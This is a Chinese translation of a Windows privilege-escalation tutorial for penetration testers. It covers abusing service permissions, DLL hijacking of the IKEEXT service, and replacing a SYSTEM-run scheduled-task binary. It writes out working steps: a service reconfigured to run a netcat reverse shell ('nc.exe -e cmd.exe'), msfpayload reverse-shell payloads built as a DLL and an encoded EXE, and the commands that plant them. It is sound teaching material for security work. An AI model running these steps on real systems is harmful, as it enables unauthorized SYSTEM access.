> 原文链接: https://www.anquanke.com//post/id/84855 


# 【技术分享】Windows下的渗透测试之提权的基本套路（下）


                                阅读量   
                                **192385**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：fuzzysecurity
                                <br>原文地址：[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t0137442ae4f5c1a9a7.jpg)](https://p0.ssl.qhimg.com/t0137442ae4f5c1a9a7.jpg)

****

**翻译：[<strong>慕容禽兽**](http://bobao.360.cn/member/contribute?uid=2667655202)</strong>

**稿费：200RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆<strong><strong>[<strong>网页版**](http://bobao.360.cn/contribute/index)</strong></strong>在线投稿</strong>



**传送门**

[**【技术分享】Windows下的渗透测试之提权的基本套路（上）**](http://bobao.360.cn/learning/detail/3158.html)****



**从t7到t10 – 撸起袖子大干一场**

到现在这个阶段，我希望我们已经有了一个SYSTEM的shell，但是如果我们还没有，仍有一些其它的途径去获得SYSTEM权限。在这个最后的部分，我们将目光投向Windows的服务和文件及文件夹权限。我们的目标是使用弱权限（权限的错误配置）来提升权限。

我们将检查大量的访问权限，所以我们可以在微软的Sysinternals工具包中拷贝accesschk.exe来使用。“Microsoft Sysinternals”包含了大量优秀的工具，非常遗憾，微软没有将它们放在Windows自带工具中。你可以从这里下载[[这里]](http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx)。

我们将从Windows服务下手，因为往往一些立竿见影的东西会在这里被发现。通常，现在的操作系统不会存在有漏洞的服务，所以，有漏洞的意思是我们可以再次配置某个服务的参数。Windwos的服务就像是软件的快捷方式，现在举个栗子：

 我们可以使用sc去查询，配置，和管理Windows服务



```
C:Windowssystem32&gt; sc qc Spooler
 [SC] QueryServiceConfig SUCCESS
SERVICE_NAME: Spooler
TYPE               : 110  WIN32_OWN_PROCESS (interactive)
START_TYPE         : 2   AUTO_START
ERROR_CONTROL      : 1   NORMAL
BINARY_PATH_NAME   : C:WindowsSystem32spoolsv.exe
LOAD_ORDER_GROUP   : SpoolerGroup
TAG                : 0
DISPLAY_NAME       : Print Spooler
DEPENDENCIES       : RPCSS
                    : http
SERVICE_START_NAME : LocalSystem
```

我们可以使用accesschk来检查每个服务需要的权限：

 我们可以看到每个用户拥有的权限。你可以使用“accesschk.exe -ucqv *”来列出所有的服务。<br>



```
C:&gt; accesschk.exe -ucqv Spooler
Spooler
  R  NT AUTHORITYAuthenticated Users
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  R  BUILTINPower Users
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  RW BUILTINAdministrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITYSYSTEM
        SERVICE_ALL_ACCESS
```

Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。确保你没有搞错，你的用户属于哪个用户组，举个栗子，“Power Users”被认为是一个低权限用户组（它使用的不多）

让我们将Windows 8 和 Windows XP SP0的输出进行对比：

```
Windows 8：
 C:Usersb33ftoolsSysinternals&gt; accesschk.exe -uwcqv "Authenticated Users" *
 No matching objects found.
```

在默认的Windwos XP SP0，我们可以看到，有一个超级大的系统缺陷：

```
C:&gt; accesschk.exe -uwcqv "Authenticated Users" *
 RW SSDPSRV
         SERVICE_ALL_ACCESS
 RW upnphost
         SERVICE_ALL_ACCESS
 C:&gt; accesschk.exe -ucqv SSDPSRV
 SSDPSRV
   RW NT AUTHORITYSYSTEM
         SERVICE_ALL_ACCESS
   RW BUILTINAdministrators
         SERVICE_ALL_ACCESS
   RW NT AUTHORITYAuthenticated Users
         SERVICE_ALL_ACCESS
   RW BUILTINPower Users
         SERVICE_ALL_ACCESS
   RW NT AUTHORITYLOCAL SERVICE
         SERVICE_ALL_ACCESS
 C:&gt; accesschk.exe -ucqv upnphost
 upnphost
   RW NT AUTHORITYSYSTEM
         SERVICE_ALL_ACCESS
   RW BUILTINAdministrators
         SERVICE_ALL_ACCESS
   RW NT AUTHORITYAuthenticated Users
         SERVICE_ALL_ACCESS
   RW BUILTINPower Users
         SERVICE_ALL_ACCESS
   RW NT AUTHORITYLOCAL SERVICE
         SERVICE_ALL_ACCESS
```

这个问题随后在XP SP2就被修复了。然而在SP0和SP1 ，它可以被用来作为通用的本地权限提升漏洞，通过对服务的重新配置，我们可以让它使用SYSTEM权限运行任何我们选择的可执行文件。

让我们看下在实践中是怎么做的，在这种情况下，这个服务将执行netcat并且使用SYSTEM权限反弹一个shell。

```
C:&gt; sc qc upnphost
 [SC] GetServiceConfig SUCCESS
 SERVICE_NAME: upnphost
         TYPE               : 20  WIN32_SHARE_PROCESS
         START_TYPE         : 3   DEMAND_START
         ERROR_CONTROL      : 1   NORMAL
         BINARY_PATH_NAME   : C:WINDOWSSystem32svchost.exe -k LocalService
         LOAD_ORDER_GROUP   :
         TAG                : 0
         DISPLAY_NAME       : Universal Plug and Play Device Host
         DEPENDENCIES       : SSDPSRV
         SERVICE_START_NAME : NT AUTHORITYLocalService
 C:&gt; sc config upnphost binpath= "C:nc.exe -nv 127.0.0.1 9988 -e C:WINDOWSSystem32cmd.exe"
 [SC] ChangeServiceConfig SUCCESS
 C:&gt; sc config upnphost obj= ".LocalSystem" password= ""
 [SC] ChangeServiceConfig SUCCESS
 C:&gt; sc qc upnphost
 [SC] GetServiceConfig SUCCESS
 SERVICE_NAME: upnphost
         TYPE               : 20  WIN32_SHARE_PROCESS
         START_TYPE         : 3   DEMAND_START
         ERROR_CONTROL      : 1   NORMAL
         BINARY_PATH_NAME   : C:nc.exe -nv 127.0.0.1 9988 -e C:WINDOWSSystem32cmd.exe
         LOAD_ORDER_GROUP   :
         TAG                : 0
         DISPLAY_NAME       : Universal Plug and Play Device Host
         DEPENDENCIES       : SSDPSRV
         SERVICE_START_NAME : LocalSystem
 C:&gt; net start upnphost
```

[![](https://p3.ssl.qhimg.com/t01976c23101ba3eee4.png)](https://p3.ssl.qhimg.com/t01976c23101ba3eee4.png)

我们不是总是对一个服务有完全的访问权限，尽管它被错误的配置了。下面的图是从Brett Moore's那里扒来的，任何一个下图的访问权限都将给我们一个SYSTEM权限的shell。

[![](https://p1.ssl.qhimg.com/t01adc4b069d317e934.png)](https://p1.ssl.qhimg.com/t01adc4b069d317e934.png)

记住我们目前的用户属于哪个用户组是很重要的，就像前面提到的“Power Users“,其实就是一个低权限的用户组。“Power Users”有它自己相关的一系列漏洞，Mark Russinovich曾经写过一篇关于“Power Users“的很有意思的文章。

[[The Power in Power Users (Mark Russinovich) – here]](http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx)

最后，我们将测试文件和文件夹的权限，如果我们不能直接攻击操作系统进行提权，那么我们可以让操作系统做一些事来帮助我们提权，这个涵盖的方面太多了，所以我在这里演示两种权限提升漏洞和利用它们的方式。一旦你掌握了核心方法，就将可以在其它的情况中应用这些方法。

对于我们的第一个例子，我将复现Parvez的做法，他曾写过《Elevating privileges by exploiting weak folder permissions》，[[Elevating privileges by exploiting weak folder permissions]](http://www.greyhathacker.net/?p=738)

这个例子是一个特殊的DLL劫持实例，应用程序通常不能通过他们本身来实现一些功能，它们有很多需要hook的资源（大多数是DLL文件但是也有可能是一些专有文件）。如果一个程序或者服务从一个我们有写入权限的目录加载某个文件，那我们就可以利用这个特性来获得一个和这个程序运行权限相同权限的shell。

通常，一个Windows应用将使用预定义的搜索路径去找上文所说的那个需要被加载的DLL，它将按照特定的顺序来检查这些路径。DLL劫持通常通过在这些路径的其中一个（同时要确保这个DLL文件在合法的DLL找到之前被找到）放置一个恶意的DLL文件来进行攻击。这种攻击方式可以通过让被攻击的应用程序对于它要使用的DLL文件，制定一个绝对的路径去放置它们来减轻危害。

下面，你可以看到在32-bit操作系统上的DLL文件的搜索顺序：

1 – 该应用程序所在的目录

2 – 32-bit System directory (C:WindowsSystem32)

3 – 16-bit System directory (C:WindowsSystem)

4 – Windows directory (C:Windows)

5 – The current working directory (CWD)

6 – Directories in the PATH environment variable (system then user)<br>

有时候，应用程序尝试加载并不存在于当前系统的DLL文件。导致这种情况的理由可能有很多，比如某个DLL文件仅仅被某些没有被安装的插件所需求。在这种情况下，Parvez发现了某些Windows服务尝试去加载不会被默认安装的DLL文件。

既然上文所说的DLL文件不存在，那我们就可以遍历所有搜索路径（例如上文的1-6）来放置我们的恶意DLL文件，但作为一个低权限用户，将一个恶意的DLL文件放在1-4路径中的希望不大。因为我们正在攻击Windwos的服务，而不是某个应用程序，因此5是不可能的。虽然看似这种攻击方式有点难度，但是一旦我们找到符合要求的路径，就屌了。

让我们看下这种攻击方式的实际应用，作为例子，我们将使用尝试去加载wlbsctrl.dll文件的的IKEEXT（IKE and AuthIP IPsec Keying Modules）服务。

```
测试环境是：Win 7 ，低权限用户
 C:Usersuser1Desktop&gt; echo %username%
 user1
```

```
通过下面的结果，可以判断出我们要成功了，因为在C盘下，如果有一个路径不是Windows默认的路径，那么我们就很可能会对它有写入的权限。
 C:Usersuser1Desktop&gt; echo %path%
 C:Windowssystem32;C:Windows;C:WindowsSystem32Wbem;C:WindowsSystem32WindowsPowerShellv1.0;
 C:Program FilesOpenVPNbin;C:Python27
```

```
我们可以使用accesschk或者cacls来检查访问权限。
 C:Usersuser1Desktop&gt; accesschk.exe -dqv "C:Python27"
 C:Python27
   Medium Mandatory Level (Default) [No-Write-Up]
   RW BUILTINAdministrators
         FILE_ALL_ACCESS
   RW NT AUTHORITYSYSTEM
         FILE_ALL_ACCESS
   R  BUILTINUsers
         FILE_LIST_DIRECTORY
         FILE_READ_ATTRIBUTES
         FILE_READ_EA
         FILE_TRAVERSE
         SYNCHRONIZE
         READ_CONTROL
   RW NT AUTHORITYAuthenticated Users
         FILE_ADD_FILE
         FILE_ADD_SUBDIRECTORY
         FILE_LIST_DIRECTORY
         FILE_READ_ATTRIBUTES
         FILE_READ_EA
         FILE_TRAVERSE
         FILE_WRITE_ATTRIBUTES
         FILE_WRITE_EA
         DELETE
         SYNCHRONIZE
         READ_CONTROL
 C:Usersuser1Desktop&gt; cacls "C:Python27"
 C:Python27 BUILTINAdministrators:(ID)F
             BUILTINAdministrators:(OI)(CI)(IO)(ID)F
             NT AUTHORITYSYSTEM:(ID)F
             NT AUTHORITYSYSTEM:(OI)(CI)(IO)(ID)F
             BUILTINUsers:(OI)(CI)(ID)R
             NT AUTHORITYAuthenticated Users:(ID)C
             NT AUTHORITYAuthenticated Users:(OI)(CI)(IO)(ID)C
```

```
在我们继续往下搞之前，我们需要检查一下IKEEXT服务的状态。在下面的例子中可以看出，它被设置成“AUTO_START”，所以它在系统启动后就自动运行了。
 C:Usersuser1Desktop&gt; sc qc IKEEXT
 [SC] QueryServiceConfig SUCCESS
 SERVICE_NAME: IKEEXT
         TYPE               : 20  WIN32_SHARE_PROCESS
         START_TYPE         : 2   AUTO_START
         ERROR_CONTROL      : 1   NORMAL
         BINARY_PATH_NAME   : C:Windowssystem32svchost.exe -k netsvcs
         LOAD_ORDER_GROUP   :
         TAG                : 0
         DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules
         DEPENDENCIES       : BFE
         SERVICE_START_NAME : LocalSystem
```

现在我们已经具备了攻击它的必需条件，我们可以生成一个恶意的DLL文件并且获得一个shell了。

```
root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O
        Name: Windows Command Shell, Reverse TCP Inline
      Module: payload/windows/shell_reverse_tcp
    Platform: Windows
        Arch: x86
 Needs Admin: No
  Total size: 314
        Rank: Normal
 Provided by:
   vlad902 &lt;vlad902@gmail.com&gt;
   sf &lt;stephen_fewer@harmonysecurity.com&gt;
 Basic options:
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  process          yes       Exit technique: seh, thread, process, none
 LHOST     127.0.0.1        yes       The listen address
 LPORT     9988             yes       The listen port
 Description:
   Connect back to attacker and spawn a command shell
 root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D &gt; 
 /root/Desktop/evil.dll
 Created by msfpayload (http://www.metasploit.com).
 Payload: windows/shell_reverse_tcp
  Length: 314
 Options: `{`"lhost"=&gt;"127.0.0.1", "lport"=&gt;"9988"`}`
```

在把恶意DLL传输到目标机器后，我们需要把它重命名为“wlbsctrl.dll”并且移动到"C:Python27"目录下，然后我们需要耐心的等待机器重启（或者我们可以尝试强制让它重启），然后我们将获得一个SYSTEM权限的shell了。

```
重要的再说一遍，下面的操作是用一个低权限的用户user1操作的。
 C:Usersuser1Desktop&gt; dir
  Volume in drive C has no label.
  Volume Serial Number is 948D-A98F
  Directory of C:Usersuser1Desktop
 02/18/2014  01:49 PM    &lt;DIR&gt;          .
 02/18/2014  01:49 PM    &lt;DIR&gt;          ..
 04/22/2013  09:39 AM           331,888 accesschk.exe
 02/18/2014  12:38 PM            14,336 evil.dll
 01/25/2014  12:46 AM            36,864 fubar.exe
 01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2
 06/30/2011  01:52 PM         1,667,584 ncat.exe
 11/22/2013  07:39 PM             1,225 wmic_info.bat
                5 File(s)      2,051,897 bytes
                3 Dir(s)      73,052,160 bytes free
 C:Usersuser1Desktop&gt; copy evil.dll C:Python27wlbsctrl.dll
         1 file(s) copied.
 C:Usersuser1Desktop&gt; dir C:Python27
  Volume in drive C has no label.
  Volume Serial Number is 948D-A98F
  Directory of C:Python27
 02/18/2014  01:53 PM    &lt;DIR&gt;          .
 02/18/2014  01:53 PM    &lt;DIR&gt;          ..
 10/20/2012  02:52 AM    &lt;DIR&gt;          DLLs
 10/20/2012  02:52 AM    &lt;DIR&gt;          Doc
 10/20/2012  02:52 AM    &lt;DIR&gt;          include
 01/28/2014  03:45 AM    &lt;DIR&gt;          Lib
 10/20/2012  02:52 AM    &lt;DIR&gt;          libs
 04/10/2012  11:34 PM            40,092 LICENSE.txt
 04/10/2012  11:18 PM           310,875 NEWS.txt
 04/10/2012  11:31 PM            26,624 python.exe
 04/10/2012  11:31 PM            27,136 pythonw.exe
 04/10/2012  11:18 PM            54,973 README.txt
 10/20/2012  02:52 AM    &lt;DIR&gt;          tcl
 10/20/2012  02:52 AM    &lt;DIR&gt;          Tools
 04/10/2012  11:31 PM            49,664 w9xpopen.exe
 02/18/2014  12:38 PM            14,336 wlbsctrl.dll
                7 File(s)        523,700 bytes
                9 Dir(s)      73,035,776 bytes free
```

万事俱备，只差重启。为了做演示，我使用Administrator用户手动的重启了这个被攻击的服务。

[![](https://p1.ssl.qhimg.com/t01ba5024b454f87fe6.png)](https://p1.ssl.qhimg.com/t01ba5024b454f87fe6.png)

最后的例子呢，让我们看一下计划任务。重新检查我们一开始搜集的关于计划任务的信息，我将对下面的条目进行讲解。

```
HostName:                             B33F
 TaskName:                             LogGrabberTFTP
 Next Run Time:                        2/19/2014 9:00:00 AM
 Status:                               Ready
 Logon Mode:                           Interactive/Background
 Last Run Time:                        N/A
 Last Result:                          1
 Author:                               B33Fb33f
 Task To Run:                          E:GrabLogstftp.exe 10.1.1.99 GET log.out E:GrabLogsLogslog.txt
 Start In:                             N/A
 Comment:                              N/A
 Scheduled Task State:                 Enabled
 Idle Time:                            Disabled
 Power Management:                     Stop On Battery Mode, No Start On Batteries
 Run As User:                          SYSTEM
 Delete Task If Not Rescheduled:       Enabled
 Stop Task If Runs X Hours and X Mins: 72:00:00
 Schedule:                             Scheduling data is not available in this format.
 Schedule Type:                        Daily
 Start Time:                           9:00:00 AM
 Start Date:                           2/17/2014
 End Date:                             N/A
 Days:                                 Every 1 day(s)
 Months:                               N/A
 Repeat: Every:                        Disabled
 Repeat: Until: Time:                  Disabled
 Repeat: Until: Duration:              Disabled
 Repeat: Stop If Still Running:        Disabled
```

从上面的结果可以看到，有一个TFTP客户端，它会在一个时间点和一个远程主机进行连接，并且下载某些日志文件。它会在每天的上午九点运行，并且是用SYSTEM权限运行的（我的天呐）。让我们看下我们对这个路径是否有写入权限。

```
C:Usersuser1Desktop&gt; accesschk.exe -dqv "E:GrabLogs"
 E:GrabLogs
   Medium Mandatory Level (Default) [No-Write-Up]
   RW BUILTINAdministrators
         FILE_ALL_ACCESS
   RW NT AUTHORITYSYSTEM
         FILE_ALL_ACCESS
   RW NT AUTHORITYAuthenticated Users
         FILE_ADD_FILE
         FILE_ADD_SUBDIRECTORY
         FILE_LIST_DIRECTORY
         FILE_READ_ATTRIBUTES
         FILE_READ_EA
         FILE_TRAVERSE
         FILE_WRITE_ATTRIBUTES
         FILE_WRITE_EA
         DELETE
         SYNCHRONIZE
         READ_CONTROL
   R  BUILTINUsers
         FILE_LIST_DIRECTORY
         FILE_READ_ATTRIBUTES
         FILE_READ_EA
         FILE_TRAVERSE
         SYNCHRONIZE
         READ_CONTROL
 C:Usersuser1Desktop&gt; dir "E:GrabLogs"
  Volume in drive E is More
  Volume Serial Number is FD53-2F00
  Directory of E:GrabLogs
 02/18/2014  11:34 PM    &lt;DIR&gt;          .
 02/18/2014  11:34 PM    &lt;DIR&gt;          ..
 02/18/2014  11:34 PM    &lt;DIR&gt;          Logs
 02/18/2014  09:21 PM           180,736 tftp.exe
                1 File(s)        180,736 bytes
                3 Dir(s)   5,454,602,240 bytes free
```

可以清楚地看到，这里有一个很严重的配置错误，对于这个计划任务来说，根本不需要使用SYSTEM的权限来运行，更糟糕的是，任何经过身份验证的用户都对这个文件夹有写入的权限。从渗透测试的合约来说，到了这一步我只需要生成一个木马，做一个后门（同时要保证它会完美的运行）就可以了，但是作为本次教学的例子，我们可以简单的用木马覆盖掉“tftp.exe”：

```
root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O
        Name: Windows Command Shell, Reverse TCP Inline
      Module: payload/windows/shell_reverse_tcp
    Platform: Windows
        Arch: x86
 Needs Admin: No
  Total size: 314
        Rank: Normal
 Provided by:
   vlad902 &lt;vlad902@gmail.com&gt;
   sf &lt;stephen_fewer@harmonysecurity.com&gt;
 Basic options:
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  process          yes       Exit technique: seh, thread, process, none
 LHOST     127.0.0.1        yes       The listen address
 LPORT     9988             yes       The listen port
 Description:
   Connect back to attacker and spawn a command shell
 root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t
 exe &gt; /root/Desktop/evil-tftp.exe
 [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
```

现在剩下的事就是上传我们的恶意文件，覆盖掉"E:GrabLogstftp.exe"，一旦做完了就早点睡觉，防止因为猝死而看不到弹回来的shell。这里要注意的是，别忘了检查一下要入侵的计算机的时间和时区。

```
C:Usersuser1Desktop&gt; dir
  Volume in drive C has no label.
  Volume Serial Number is 948D-A98F
  Directory of C:Usersuser1Desktop
 02/19/2014  01:36 AM    &lt;DIR&gt;          .
 02/19/2014  01:36 AM    &lt;DIR&gt;          ..
 04/22/2013  09:39 AM           331,888 accesschk.exe
 02/19/2014  01:31 AM            73,802 evil-tftp.exe
 01/25/2014  12:46 AM            36,864 fubar.exe
 01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2
 06/30/2011  01:52 PM         1,667,584 ncat.exe
 02/18/2014  12:38 PM            14,336 wlbsctrl.dll
 11/22/2013  07:39 PM             1,225 wmic_info.bat
                6 File(s)      2,125,699 bytes
                3 Dir(s)      75,341,824 bytes free
 C:Usersuser1Desktop&gt; copy evil-tftp.exe E:GrabLogstftp.exe
 Overwrite E:GrabLogstftp.exe? (Yes/No/All): Yes
         1 file(s) copied.
```

[![](https://p5.ssl.qhimg.com/t0178df24cf781b6ffa.png)](https://p5.ssl.qhimg.com/t0178df24cf781b6ffa.png)

这两个例子给了你提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点事易受攻击的点。你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项。

通过上面的各个例子，我们可以看出accesschk称得上是杀人越货的必备工具，在文章结束之前，我想给你一些在使用accesschk上的建议。

```
当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，这是一个大问题，然而我们可以添加一个额外的参数“/accepteula”去自动接受许可协议。
 accesschk.exe /accepteula ... ... ...
 找出某个驱动器下所有权限配置有缺陷的文件夹路径
 accesschk.exe -uwdqs Users c:
 accesschk.exe -uwdqs "Authenticated Users" c:
 找出某个驱动器下所有权限配置有缺陷的文件路径
 accesschk.exe -uwqs Users c:*.*
 accesschk.exe -uwqs "Authenticated Users" c:*.*
```



**总结**

这份指南写的是Windows提权的一些基本套路，如果你想真正的精通Windows提权，你需要投入大量的精力去研究。对于渗透测试的各个阶段，信息搜集环节总是最关键的，你对目标机器了解的越多，你的思路就越猥琐，你成功的几率就越大。

有时候你会将你的权限提升到Administrator，从Administrator提升到SYSTEM权限是不成问题的，你依旧可以重新配置一个服务，或者创建一个用SYSTEM权限运行的计划任务。

现在，搞起来搞起来搞起来！SYSTEMSYSTEMSYSTEM！

<br>

**传送门**

**[【技术分享】Windows下的渗透测试之提权的基本套路（上）](http://bobao.360.cn/learning/detail/3158.html)**


